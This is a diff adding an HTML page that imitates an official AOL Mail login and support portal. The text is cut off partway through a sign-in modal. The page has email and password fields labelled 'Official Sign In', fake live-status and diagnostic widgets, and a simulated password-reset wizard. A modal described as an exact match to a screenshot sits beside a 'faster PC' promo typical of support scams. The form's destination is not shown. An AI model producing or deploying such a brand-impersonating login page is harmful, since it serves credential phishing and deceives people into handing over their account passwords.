@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aol Login | My AOL Mail Login - Official Sign In & Support Guide</title>
+  <meta name="description" content="Aol Mail Sign in to AOL. Access your AOL Mail account securely, recover password, and troubleshoot login issues with step-by-step guides.">
+  
+  <!-- Google Fonts: Inter & Outfit -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;500;600;700;800;900&family=Merriweather:wght@300;400;700&display=swap" rel="stylesheet">
+  
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+  
+  <!-- Stylesheet -->
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+
+  <!-- Top Slate Dark Navigation Bar -->
+  <header class="top-nav-bar">
+    <div class="top-nav-container">
+      <div class="top-brand-group">
+        <span class="top-header-title">Aol Mail Sign in to AOL</span>
+        <span class="live-pulse-badge">
+          <span class="pulse-dot"></span>
+          <span>Live: Operational</span>
+        </span>
+      </div>
+      <div class="top-header-action">
+        <button type="button" class="btn-top-login" id="btn-open-login-modal">LOGIN</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Page Breadcrumb & Title Bar -->
+  <div class="page-title-bar">
+    <div class="container breadcrumb-flex">
+      <h1 class="page-main-heading">Aol Login | My AOL Mail Login</h1>
+      <div class="quick-nav-links">
+        <button type="button" class="q-link-btn" id="btn-quick-nav-login">Sign In</button>
+        <a href="#quick-support-hub" class="q-link">Quick Help</a>
+        <a href="#overview-guide-section" class="q-link">Overview</a>
+        <a href="#how-to-login-computer" class="q-link">How to Login</a>
+        <a href="#password-recovery-section" class="q-link">Password Reset</a>
+        <a href="#troubleshooting-section" class="q-link">Troubleshooting</a>
+        <a href="#requirements-section" class="q-link">Requirements</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Notification Container -->
+  <div id="toast-container" class="toast-container"></div>
+
+  <!-- HERO SECTION: Vibrant Multi-Tone Aurora Palette & Modern Card Architecture -->
+  <section class="hero-banner-section" id="hero-login-section">
+    <div class="container">
+      <div class="hero-canvas-card">
+        
+        <!-- Multi-Color Aurora Mesh & Fluid Waves -->
+        <div class="canvas-bg-waves">
+          <div class="ambient-glow-circle glow-indigo"></div>
+          <div class="ambient-glow-circle glow-coral"></div>
+          <div class="ambient-glow-circle glow-cyan"></div>
+          <svg class="wave-svg-layer" viewBox="0 0 1000 500" preserveAspectRatio="none">
+            <path d="M0,0 C170,50 270,150 350,290 C390,360 440,430 530,500 L0,500 Z" fill="url(#wave-aurora-light)" opacity="0.95"/>
+            <path d="M0,240 C100,250 190,300 290,410 C330,450 360,470 400,500 L0,500 Z" fill="url(#wave-sunset-violet)" opacity="0.88"/>
+            <path d="M0,340 C60,340 130,380 190,500 L0,500 Z" fill="url(#wave-deep-indigo)"/>
+            <defs>
+              <linearGradient id="wave-aurora-light" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#f5f3ff"/>
+                <stop offset="50%" stop-color="#e0e7ff"/>
+                <stop offset="100%" stop-color="#ccfbf1"/>
+              </linearGradient>
+              <linearGradient id="wave-sunset-violet" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#4f46e5"/>
+                <stop offset="50%" stop-color="#7c3aed"/>
+                <stop offset="100%" stop-color="#06b6d4"/>
+              </linearGradient>
+              <linearGradient id="wave-deep-indigo" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#1e1b4b"/>
+                <stop offset="100%" stop-color="#312e81"/>
+              </linearGradient>
+            </defs>
+          </svg>
+        </div>
+
+        <div class="hero-content-grid">
+          
+          <!-- Left Column: Branding Showcase with High-Contrast Colors -->
+          <div class="hero-brand-panel">
+            <div class="aol-brand-wrapper">
+              <div class="aol-official-logo">
+                <span class="logo-txt">AOL</span>
+                <!-- Radiant Multi-Color Swoosh -->
+                <svg class="swoosh-curve" viewBox="0 0 160 35" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M4 25C44 7 110 5 156 21" stroke="url(#swoosh-aurora-grad)" stroke-width="7" stroke-linecap="round"/>
+                  <defs>
+                    <linearGradient id="swoosh-aurora-grad" x1="0%" y1="0%" x2="100%" y2="0%">
+                      <stop offset="0%" stop-color="#4f46e5"/>
+                      <stop offset="35%" stop-color="#8b5cf6"/>
+                      <stop offset="70%" stop-color="#ec4899"/>
+                      <stop offset="100%" stop-color="#06b6d4"/>
+                    </linearGradient>
+                  </defs>
+                </svg>
+              </div>
+            </div>
+
+            <div class="tagline-block">
+              <h2 class="tagline-black">Connecting Today.</h2>
+              <h2 class="tagline-blue">Empowering Tomorrow.</h2>
+              <div class="tagline-blue-bar"></div>
+            </div>
+
+            <!-- Feature & Keyword Pills -->
+            <div class="hero-quick-features">
+              <span class="feature-chip chip-emerald"><i data-lucide="shield-check"></i> 100% Secure Webmail</span>
+              <span class="feature-chip chip-amber"><i data-lucide="zap"></i> Fast &amp; Reliable Access</span>
+              <span class="feature-chip chip-violet"><i data-lucide="key-round"></i> Email Password Reset</span>
+              <span class="feature-chip chip-cyan"><i data-lucide="refresh-cw"></i> Recover Email Password</span>
+              <span class="feature-chip chip-coral"><i data-lucide="help-circle"></i> Forgot Email Password</span>
+              <span class="feature-chip chip-emerald"><i data-lucide="user-check"></i> Recover Mail Account</span>
+              <span class="feature-chip chip-indigo"><i data-lucide="lock"></i> Mail Password Recovery</span>
+              <span class="feature-chip chip-violet"><i data-lucide="unlock"></i> Forgot Password</span>
+              <span class="feature-chip chip-coral"><i data-lucide="alert-triangle"></i> Login Errors</span>
+            </div>
+
+          </div>
+
+          <!-- Right Column: Glassmorphic Floating Login Card -->
+          <div class="hero-form-panel">
+            <div class="login-card" id="login-card-box">
+              <div class="login-card-header">
+                <div class="login-badge-tag">Official Sign In</div>
+                <h3 class="login-card-title">Welcome Back</h3>
+                <p class="login-card-subtitle">Sign in to continue to your account</p>
+              </div>
+
+              <form id="aol-login-form" class="login-form" autocomplete="on">
+                
+                <!-- Email or Username -->
+                <div class="form-group">
+                  <label for="login-email" class="field-label">Email or Username</label>
+                  <div class="input-wrapper">
+                    <i data-lucide="user" class="input-left-icon"></i>
+                    <input 
+                      type="text" 
+                      id="login-email" 
+                      name="email" 
+                      class="form-input" 
+                      placeholder="Enter your email or username" 
+                      required 
+                      autocomplete="username"
+                    />
+                  </div>
+                  <div class="domain-quick-tags">
+                    <span class="tag-hint">Quick fill:</span>
+                    <button type="button" class="domain-tag" data-domain="@aol.com">+ @aol.com</button>
+                    <button type="button" class="domain-tag" data-domain="@aim.com">+ @aim.com</button>
+                    <button type="button" class="domain-tag" data-domain="@verizon.net">+ @verizon.net</button>
+                  </div>
+                </div>
+
+                <!-- Password -->
+                <div class="form-group">
+                  <label for="login-password" class="field-label">Password</label>
+                  <div class="input-wrapper">
+                    <i data-lucide="lock" class="input-left-icon"></i>
+                    <input 
+                      type="password" 
+                      id="login-password" 
+                      name="password" 
+                      class="form-input" 
+                      placeholder="Enter your password" 
+                      required 
+                      autocomplete="current-password"
+                    />
+                    <button type="button" class="btn-eye-toggle" id="toggle-pw-btn" aria-label="Toggle password visibility">
+                      <i data-lucide="eye" id="pw-eye-icon"></i>
+                    </button>
+                  </div>
+                </div>
+
+                <!-- Remember me & Forgot password? -->
+                <div class="form-row-options">
+                  <label class="remember-label">
+                    <input type="checkbox" id="remember-me" name="remember" checked />
+                    <span class="chk-box"></span>
+                    <span class="chk-text">Remember me</span>
+                  </label>
+                  <a href="#password-recovery-section" class="forgot-pw-link" id="trigger-forgot-pw">Forgot password?</a>
+                </div>
+
+                <!-- Vibrant Solid Blue Sign In Button -->
+                <button type="submit" class="btn-signin-primary" id="btn-submit-login">
+                  <span class="btn-text">Sign In</span>
+                  <i data-lucide="arrow-right" class="btn-icon-arrow"></i>
+                  <span class="btn-spinner" style="display:none;"></span>
+                </button>
+
+                <!-- Divider -->
+                <div class="divider-or">
+                  <span>or</span>
+                </div>
+
+                <!-- Sign in with Google -->
+                <button type="button" class="btn-google-auth" id="btn-google-login">
+                  <svg class="google-svg" viewBox="0 0 24 24" width="18" height="18">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+                  </svg>
+                  <span>Sign in with Google</span>
+                </button>
+
+                <!-- Demo Autofill Helper -->
+                <div class="demo-card-autofill">
+                  <button type="button" class="btn-autofill-demo" id="btn-autofill-demo">
+                    <i data-lucide="zap"></i> Quick Demo: <strong>user@aol.com</strong> / <strong>password123</strong>
+                  </button>
+                </div>
+
+              </form>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Info (i) Icon at bottom left corner -->
+        <div class="canvas-info-icon" title="AOL Mail Portal Help">
+          <i data-lucide="info"></i>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================================
+       QUICK ASSISTANCE & SUPPORT HUB (Color-Coded Cards)
+       ========================================================================= -->
+  <section class="quick-support-hub-section" id="quick-support-hub">
+    <div class="container">
+      <div class="support-hub-grid">
+        
+        <!-- Card 1: Password Reset (Violet / Purple Accent) -->
+        <div class="support-hub-card card-theme-violet">
+          <div class="hub-card-icon-wrap icon-violet">
+            <i data-lucide="key-round"></i>
+          </div>
+          <div class="hub-card-content">
+            <div class="hub-card-tag tag-violet">Account Recovery</div>
+            <h3 class="hub-card-title">Reset Password</h3>
+            <p class="hub-card-desc">Forgot your password? Recover your account quickly with SMS or email verification code.</p>
+            <a href="#password-recovery-section" class="hub-card-link link-violet">
+              <span>Reset Password</span>
+              <i data-lucide="arrow-right"></i>
+            </a>
+          </div>
+        </div>
+
+        <!-- Card 2: Troubleshoot Login Errors (Sunset Coral Accent) -->
+        <div class="support-hub-card card-theme-coral">
+          <div class="hub-card-icon-wrap icon-coral">
+            <i data-lucide="wrench"></i>
+          </div>
+          <div class="hub-card-content">
+            <div class="hub-card-tag tag-coral">Troubleshooting</div>
+            <h3 class="hub-card-title">Troubleshoot Errors</h3>
+            <p class="hub-card-desc">Fix blank screens, iPhone sync errors, and incorrect password alerts easily.</p>
+            <a href="#troubleshooting-section" class="hub-card-link link-coral">
+              <span>Fix Common Issues</span>
+              <i data-lucide="arrow-right"></i>
+            </a>
+          </div>
+        </div>
+
+        <!-- Card 3: Multi-Device Login Guide (Emerald Green Accent) -->
+        <div class="support-hub-card card-theme-emerald">
+          <div class="hub-card-icon-wrap icon-emerald">
+            <i data-lucide="laptop"></i>
+          </div>
+          <div class="hub-card-content">
+            <div class="hub-card-tag tag-emerald">Device Setup</div>
+            <h3 class="hub-card-title">How to Log In</h3>
+            <p class="hub-card-desc">Step-by-step walkthrough for Computer Web, iPhone Mail app, and Android setup.</p>
+            <a href="#how-to-login-computer" class="hub-card-link link-emerald">
+              <span>View Login Steps</span>
+              <i data-lucide="arrow-right"></i>
+            </a>
+          </div>
+        </div>
+
+        <!-- Card 4: 1-Click Port & Health Diagnostic (Ocean Cyan Accent) -->
+        <div class="support-hub-card card-theme-cyan">
+          <div class="hub-card-icon-wrap icon-cyan">
+            <i data-lucide="activity"></i>
+          </div>
+          <div class="hub-card-content">
+            <div class="hub-card-tag tag-cyan">Server Health</div>
+            <h3 class="hub-card-title">System &amp; Port Health</h3>
+            <p class="hub-card-desc">Test AOL Edge server latency, IMAP Port 993 SSL, and SMTP 587 TLS connectivity.</p>
+            <a href="#troubleshooting-section" class="hub-card-link link-cyan">
+              <span>Run Diagnostic</span>
+              <i data-lucide="arrow-right"></i>
+            </a>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================================
+       SECTION 1: Overview & Sign In Guide
+       ========================================================================= -->
+  <section class="article-section" id="overview-guide-section">
+    <div class="container">
+      
+      <div class="article-block">
+        <div class="section-title-wrap">
+          <h2 class="article-title">Aol Login | My AOL Mail Login - Sign in</h2>
+          <div class="heading-accent-line"></div>
+        </div>
+        
+        <p class="article-lead">
+          AOL Mail is one of the most trusted and widely used email services, known for its clean interface, strong security features, advanced spam protection, and seamless access across multiple devices. Whether you are a new user signing in for the first time or an existing user experiencing login issues, this complete <strong>AOL Mail login guide</strong> is designed to help you access your account safely, quickly, and with confidence.
+        </p>
+
+        <!-- Common Issues Cards -->
+        <div class="common-issues-list-box">
+          <ul class="issues-bullet-list">
+            <li class="issue-card-item">
+              <span class="bullet-square">▪</span>
+              <div class="issue-text">
+                <strong>"AOL Mail login blank screen"</strong>
+                <p>Commonly caused by outdated browser cookies, ad-blocking extensions, or TLS caching.</p>
+              </div>
+            </li>
+            <li class="issue-card-item">
+              <span class="bullet-square">▪</span>
+              <div class="issue-text">
+                <strong>"AOL Mail not syncing on iPhone"</strong>
+                <p>Fixed by re-authenticating via IMAP port 993 SSL or generating a dedicated App Password.</p>
+              </div>
+            </li>
+            <li class="issue-card-item">
+              <span class="bullet-square">▪</span>
+              <div class="issue-text">
+                <strong>"Invalid password error but the password is correct"</strong>
+                <p>Often caused by Caps Lock, browser password autofill desynchronization, or temporary lockouts.</p>
+              </div>
+            </li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- How to Log In to AOL Mail on a Computer or Laptop -->
+      <div class="article-block" id="how-to-login-computer">
+        <div class="section-title-wrap">
+          <h2 class="article-title">How to Log In to AOL Mail on a Computer or Laptop</h2>
+          <div class="heading-accent-line"></div>
+        </div>
+        <p class="article-subtext">Follow the steps below to access your AOL Mail account on a desktop or laptop browser.</p>
+        
+        <!-- Multi-device tabs -->
+        <div class="guide-tabs-bar">
+          <button class="g-tab-btn active" data-tab="gtab-pc"><i data-lucide="laptop"></i> Computer / Laptop (Web)</button>
+          <button class="g-tab-btn" data-tab="gtab-ios"><i data-lucide="smartphone"></i> iPhone / iPad (Mail App)</button>
+          <button class="g-tab-btn" data-tab="gtab-android"><i data-lucide="tablet-smartphone"></i> Android Devices</button>
+          <button class="g-tab-btn" data-tab="gtab-imap"><i data-lucide="server"></i> Outlook &amp; IMAP Settings</button>
+        </div>
+
+        <!-- Tab 1: PC / Laptop Steps -->
+        <div class="g-tab-content active" id="gtab-pc">
+          <div class="numbered-step-list">
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">1</div>
+              <div class="n-body">
+                <strong>Open the AOL Website:</strong> Open your preferred web browser (Google Chrome, Firefox, Microsoft Edge, Safari) and go to the official AOL Mail login page.
+              </div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">2</div>
+              <div class="n-body">
+                <strong>Enter Your Username or Email:</strong> Type your full AOL email ID (example: <code>yourname@aol.com</code>) or your AOL username and click Next.
+              </div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">3</div>
+              <div class="n-body">
+                <strong>Enter Your Password:</strong> Carefully type your account password into the password field. Ensure Caps Lock is turned off.
+              </div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">4</div>
+              <div class="n-body">
+                <strong>Click Sign In:</strong> Click the blue <strong>Sign In</strong> button to securely access your inbox and emails.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Tab 2: iPhone / iOS -->
+        <div class="g-tab-content" id="gtab-ios" style="display:none;">
+          <div class="numbered-step-list">
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">1</div>
+              <div class="n-body"><strong>Open iPhone Settings:</strong> Go to <em>Settings &gt; Mail &gt; Accounts</em>.</div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">2</div>
+              <div class="n-body"><strong>Add Account:</strong> Tap <em>Add Account</em> and select <strong>AOL</strong> from the provider list.</div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">3</div>
+              <div class="n-body"><strong>Sign In:</strong> Enter your full email and password. If 2FA is active, use a generated AOL App Password.</div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">4</div>
+              <div class="n-body"><strong>Save &amp; Sync:</strong> Toggle Mail, Contacts, and Calendars, then tap Save.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Tab 3: Android -->
+        <div class="g-tab-content" id="gtab-android" style="display:none;">
+          <div class="numbered-step-list">
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">1</div>
+              <div class="n-body"><strong>Open Gmail App:</strong> Tap your profile picture at the top right and select <em>Add another account</em>.</div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">2</div>
+              <div class="n-body"><strong>Choose AOL:</strong> Select AOL from the list and enter your email address.</div>
+            </div>
+            <div class="n-step-item">
+              <div class="n-num-circle circle-indigo">3</div>
+              <div class="n-body"><strong>Authenticate:</strong> Enter your password and allow sync permissions.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Tab 4: IMAP Settings -->
+        <div class="g-tab-content" id="gtab-imap" style="display:none;">
+          <div class="imap-table-card">
+            <table class="imap-table">
+              <thead>
+                <tr>
+                  <th>Configuration Setting</th>
+                  <th>Incoming Server (IMAP)</th>
+                  <th>Outgoing Server (SMTP)</th>
+                  <th>POP3 Server</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><strong>Server Hostname</strong></td>
+                  <td><code>imap.aol.com</code></td>
+                  <td><code>smtp.aol.com</code></td>
+                  <td><code>pop.aol.com</code></td>
+                </tr>
+                <tr>
+                  <td><strong>Port Number</strong></td>
+                  <td><code>993</code> (SSL)</td>
+                  <td><code>587</code> or <code>465</code> (TLS)</td>
+                  <td><code>995</code> (SSL)</td>
+                </tr>
+                <tr>
+                  <td><strong>SSL/TLS Required</strong></td>
+                  <td>Yes</td>
+                  <td>Yes</td>
+                  <td>Yes</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- =========================================================================
+       SECTION 2: AOL Mail Password Recovery
+       ========================================================================= -->
+  <section class="article-section bg-subtle" id="password-recovery-section">
+    <div class="container">
+      <div class="article-block">
+        <div class="section-title-wrap">
+          <h2 class="article-title">AOL Mail Password Recovery – Forgot Password?</h2>
+          <div class="heading-accent-line"></div>
+        </div>
+        
+        <p class="article-lead">
+          If you are locked out of your AOL Mail account and searching for AOL Mail password recovery, you are in the right place. Forgetting your password can be frustrating, especially when you need urgent access to emails.
+        </p>
+        
+        <p class="article-body-p">
+          The good news is that you can reset your AOL Mail password in just a few minutes by following the official recovery process:
+        </p>
+
+        <!-- 6 Steps Breakdown from Screenshot 3 -->
+        <div class="numbered-step-list">
+          <div class="n-step-item">
+            <div class="n-num-circle circle-violet">1</div>
+            <div class="n-body">
+              <strong>Visit the AOL Login Page:</strong> Go to the official AOL sign-in page.
+            </div>
+          </div>
+          <div class="n-step-item">
+            <div class="n-num-circle circle-violet">2</div>
+            <div class="n-body">
+              <strong>Click on "Forgot Password?":</strong> Below the login field, click the Forgot password? option.
+            </div>
+          </div>
+          <div class="n-step-item">
+            <div class="n-num-circle circle-violet">3</div>
+            <div class="n-body">
+              <strong>Enter Your AOL Email Address:</strong> Type your full AOL email ID (example: <code>yourname@aol.com</code>) and click Continue.
+            </div>
+          </div>
+          <div class="n-step-item">
+            <div class="n-num-circle circle-violet">4</div>
+            <div class="n-body">
+              <strong>Verify Your Identity:</strong> AOL will ask you to confirm that you are the account owner. You may receive a verification code on your recovery phone number, a reset link on your recovery email, or a security question verification (if set previously). Choose the available method and complete verification.
+            </div>
+          </div>
+          <div class="n-step-item">
+            <div class="n-num-circle circle-violet">5</div>
+            <div class="n-body">
+              <strong>Create a New Password:</strong> After verification, create a strong new password. A secure password should include at least 8–12 characters, uppercase and lowercase letters, numbers, and special characters like @, #, $, %.
+            </div>
+          </div>
+          <div class="n-step-item">
+            <div class="n-num-circle circle-violet">6</div>
+            <div class="n-body">
+              <strong>Click Continue:</strong> Your password will be updated successfully.
+            </div>
+          </div>
+        </div>
+
+        <!-- Interactive Password Reset Wizard -->
+        <div class="interactive-recovery-card">
+          <div class="rec-header">
+            <div class="rec-icon-wrap">
+              <i data-lucide="key-round"></i>
+            </div>
+            <div>
+              <h3>Interactive AOL Password Reset Wizard</h3>
+              <p>Test and execute the recovery process in real time with instant simulated OTP verification.</p>
+            </div>
+          </div>
+
+          <div class="rec-wizard-flow">
+            <!-- Step 1 -->
+            <div class="rec-step-pane active" id="rec-pane-1">
+              <label class="field-label">Enter your AOL email address:</label>
+              <div class="input-action-row">
+                <input type="text" id="rec-input-email" class="form-input" placeholder="user@aol.com" value="user@aol.com" />
+                <button type="button" class="btn-signin-primary" id="btn-rec-step1">
+                  <span>Send Code</span> <i data-lucide="arrow-right"></i>
+                </button>
+              </div>
+            </div>
+
+            <!-- Step 2 -->
+            <div class="rec-step-pane" id="rec-pane-2" style="display:none;">
+              <p class="rec-note" id="rec-code-note">We sent a 6-digit OTP code to your recovery contact.</p>
+              <div class="otp-row">
+                <input type="text" id="rec-input-otp" class="form-input otp-field" placeholder="6-digit code" maxlength="6" />
+                <button type="button" class="btn-autofill-demo" id="btn-rec-autofill-otp">
+                  <i data-lucide="zap"></i> Insert OTP (<span id="rec-otp-val">------</span>)
+                </button>
+              </div>
+              <button type="button" class="btn-signin-primary" id="btn-rec-verify" style="margin-top:12px;">
+                <span>Verify Code</span> <i data-lucide="check-circle"></i>
+              </button>
+            </div>
+
+            <!-- Step 3 -->
+            <div class="rec-step-pane" id="rec-pane-3" style="display:none;">
+              <label class="field-label">Enter your new password (minimum 8 characters):</label>
+              <div class="input-action-row">
+                <input type="password" id="rec-input-newpw" class="form-input" placeholder="Enter new password" />
+                <button type="button" class="btn-signin-primary" id="btn-rec-save">
+                  <span>Save Password</span> <i data-lucide="lock"></i>
+                </button>
+              </div>
+            </div>
+
+            <!-- Step 4 Success -->
+            <div class="rec-step-pane" id="rec-pane-success" style="display:none;text-align:center;padding:15px 0;">
+              <div class="success-icon-badge">
+                <i data-lucide="check-circle"></i>
+              </div>
+              <h4 style="font-size:18px;color:#0f172a;margin-bottom:4px;">Password Reset Successfully!</h4>
+              <p style="font-size:14px;color:#64748b;margin-bottom:14px;">Your password has been updated. You can now sign in at the top.</p>
+              <a href="#hero-login-section" class="btn-signin-primary" style="display:inline-flex;width:auto;padding:10px 24px;">
+                Back to Sign In Form
+              </a>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================================
+       SECTION 3: Troubleshooting Common AOL Login Errors
+       ========================================================================= -->
+  <section class="article-section" id="troubleshooting-section">
+    <div class="container">
+      <div class="article-block">
+        <div class="section-title-wrap">
+          <h2 class="article-title">Troubleshooting Common AOL Login Errors</h2>
+          <div class="heading-accent-line"></div>
+        </div>
+        <p class="article-lead">
+          If you are having trouble accessing your inbox, here are quick fixes to the most common issues users face:
+        </p>
+
+        <!-- Troubleshooting Cards List -->
+        <div class="trouble-list-wrapper">
+          
+          <div class="trouble-card-box">
+            <div class="trouble-header">
+              <span class="trouble-bullet">▪</span>
+              <h3 class="trouble-heading">AOL Mail login blank screen:</h3>
+            </div>
+            <p class="trouble-body">
+              If you experience an AOL Mail login blank screen, clear your browser cache and cookies, or disable any ad-blocking extensions that might be interfering with the login portal.
+            </p>
+          </div>
+
+          <div class="trouble-card-box">
+            <div class="trouble-header">
+              <span class="trouble-bullet">▪</span>
+              <h3 class="trouble-heading">AOL Mail not syncing on iPhone:</h3>
+            </div>
+            <p class="trouble-body">
+              To fix AOL Mail not syncing on iPhone, go to your iPhone's Settings &gt; Mail &gt; Accounts, delete your AOL account, and then re-add it to refresh the server connection.
+            </p>
+          </div>
+
+          <div class="trouble-card-box">
+            <div class="trouble-header">
+              <span class="trouble-bullet">▪</span>
+              <h3 class="trouble-heading">Invalid password error but the password is correct:</h3>
+            </div>
+            <p class="trouble-body">
+              Seeing an invalid password error but the password is correct? Ensure your Caps Lock is turned off. If the problem persists, try logging in via an incognito window or a different web browser to rule out browser conflicts.
+            </p>
+          </div>
+
+        </div>
+
+        <!-- 1-Click Auto Diagnostic Tool -->
+        <div class="diag-banner-box">
+          <div class="diag-left">
+            <div class="diag-icon-wrap">
+              <i data-lucide="activity"></i>
+            </div>
+            <div>
+              <h4>One-Click Connection &amp; Port Health Diagnostic</h4>
+              <p>Test AOL Edge servers, IMAP 993, SMTP 587, and browser cookie compatibility automatically.</p>
+            </div>
+          </div>
+          <button type="button" class="btn-diag-run" id="btn-run-diag">
+            <i data-lucide="play"></i> <span>Run Diagnostic</span>
+          </button>
+        </div>
+
+        <div class="diag-results-panel" id="diag-results-box" style="display:none;">
+          <div class="diag-results-grid" id="diag-grid-container">
+            <!-- Dynamic results -->
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- =========================================================================
+       SECTION 4: Requirements Before AOL Mail Login
+       ========================================================================= -->
+  <section class="article-section bg-subtle" id="requirements-section">
+    <div class="container">
+      <div class="article-block">
+        <div class="section-title-wrap">
+          <h2 class="article-title">Requirements Before AOL Mail Login</h2>
+          <div class="heading-accent-line"></div>
+        </div>
+        <p class="article-lead">
+          Before signing in to your AOL Mail account, ensure you have the following essentials ready:
+        </p>
+
+        <div class="requirements-grid-wrapper">
+          
+          <div class="req-box-item">
+            <div class="req-box-top">
+              <span class="req-icon-symbol">🌐</span>
+              <strong>A stable internet connection</strong>
+            </div>
+            <p>Ensures secure TLS 1.3 handshake and prevents sign-in timeout errors.</p>
+            <div class="req-status-badge"><i data-lucide="check"></i> Live Status: Connected</div>
+          </div>
+
+          <div class="req-box-item">
+            <div class="req-box-top">
+              <span class="req-icon-symbol">💻</span>
+              <strong>A compatible web browser</strong>
+            </div>
+            <p>Up-to-date Chrome, Firefox, Edge, or Safari with JavaScript &amp; Cookies enabled.</p>
+            <div class="req-status-badge"><i data-lucide="check"></i> Browser: Supported</div>
+          </div>
+
+          <div class="req-box-item">
+            <div class="req-box-top">
+              <span class="req-icon-symbol">✉️</span>
+              <strong>Your AOL email address or username</strong>
+            </div>
+            <p>Your primary account handle (e.g. <code>username@aol.com</code> or <code>@aim.com</code>).</p>
+            <div class="req-status-badge"><i data-lucide="check"></i> Account Handle Ready</div>
+          </div>
+
+          <div class="req-box-item">
+            <div class="req-box-top">
+              <span class="req-icon-symbol">🔐</span>
+              <strong>Your AOL account password</strong>
+            </div>
+            <p>Confidential password or App Password for external desktop mail clients.</p>
+            <div class="req-status-badge"><i data-lucide="check"></i> Security Protocols Active</div>
+          </div>
+
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- Portal Footer -->
+  <footer class="portal-footer">
+    <div class="container footer-inner">
+      <div class="footer-brand">
+        <div class="aol-footer-logo">
+          <span class="f-a">A</span><span class="f-o">O</span><span class="f-l">L</span>
+        </div>
+        <p>Connecting users securely to email since 1985.</p>
+      </div>
+      <div class="footer-links">
+        <button type="button" class="footer-btn-link" id="btn-footer-login">Sign In</button>
+        <a href="#quick-support-hub">Quick Help</a>
+        <a href="#overview-guide-section">Overview</a>
+        <a href="#how-to-login-computer">How to Login</a>
+        <a href="#password-recovery-section">Password Recovery</a>
+        <a href="#troubleshooting-section">Troubleshooting</a>
+        <a href="#requirements-section">Requirements</a>
+      </div>
+    </div>
+    <div class="footer-bottom-copy">
+      <div class="container">
+        <p>&copy; 2026 AOL Mail Support &amp; Portal Hub. All rights reserved. AOL and the AOL logo are registered trademarks.</p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- =========================================================================
+       DEDICATED FULLSCREEN AOL LOGIN MODAL (EXACT MATCH TO USER SCREENSHOT)
+       "Simple solutions for a faster PC!" + Official AOL 2-Step Login Card
+       ========================================================================= -->
+  <div class="official-login-modal-overlay" id="official-login-modal" style="display:none;">
+    <div class="official-login-modal-box">
+      
+      <!-- Top Modal Header -->
+      <div class="modal-brand-header">
+        <div class="modal-aol-logo">AOL</div>
+        <button type="button" class="btn-close-modal" id="btn-close-login-modal" aria-label="Close Login Modal">
+          <i data-lucide="x"></i>
+        </button>
+      </div>
+
+      <!-- Modal Two-Column Body -->
+      <div class="official-login-body-grid">
+        
+        <!-- Left Side: Promo Card with Laptop Image -->
+        <div class="login-modal-promo-col">
+          <h2 class="promo-heading">Simple solutions<br>for a faster PC!</h2>
+          <p class="promo-subheading">Boost your computer's speed with our advanced tools.</p>
+          
+          <div class="promo-image-frame">
+            <img src="/images/laptop_promo.jpg" alt="Laptop speed solutions" class="promo-laptop-img" id="modal-laptop-img" />
+          </div>
+        </div>
+
+        <!-- Right Side: Exact AOL Sign-In Card -->
+        <div class="login-modal-card-col">
+          <div class="official-aol-card">
+            
+            <div class="official-aol-header">
+              <div class="card-aol-wordmark">AOL</div>
+              <h3 class="card-signin-title">Sign in</h3>
+            </div>
+
